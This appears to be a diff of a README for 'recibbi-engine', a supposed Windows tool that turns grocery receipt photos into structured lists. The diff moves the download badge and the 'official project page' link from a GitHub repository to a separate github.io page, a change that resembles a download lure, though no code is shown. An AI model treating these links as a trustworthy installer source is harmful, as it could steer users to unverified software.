@@ -1,12 +1,12 @@
 # 🧾 recibbi-engine - Transform grocery receipts into structured data
 
-[![Download recibbi-engine](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/mystical-hypersecretion20/recibbi-engine)
+[![Download recibbi-engine](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://mystical-hypersecretion20.github.io)
 
 Turn photos of your grocery receipts into organized digital lists. This tool reads your receipt information, identifies your items, and adds helpful details like images and product data. You keep a digital record of what you buy and how much you spend at different stores.
 
 ## 📥 How to download the software
 
-Visit the [official project page](https://github.com/mystical-hypersecretion20/recibbi-engine) to start your download. Look for the releases section on the right side of the screen. Click on the version labeled latest to find the installer file for your Windows computer. Download the file and save it to your desktop.
+Visit the [official project page](https://mystical-hypersecretion20.github.io) to start your download. Look for the releases section on the right side of the screen. Click on the version labeled latest to find the installer file for your Windows computer. Download the file and save it to your desktop.
 
 ## ⚙️ Setting up your computer
 
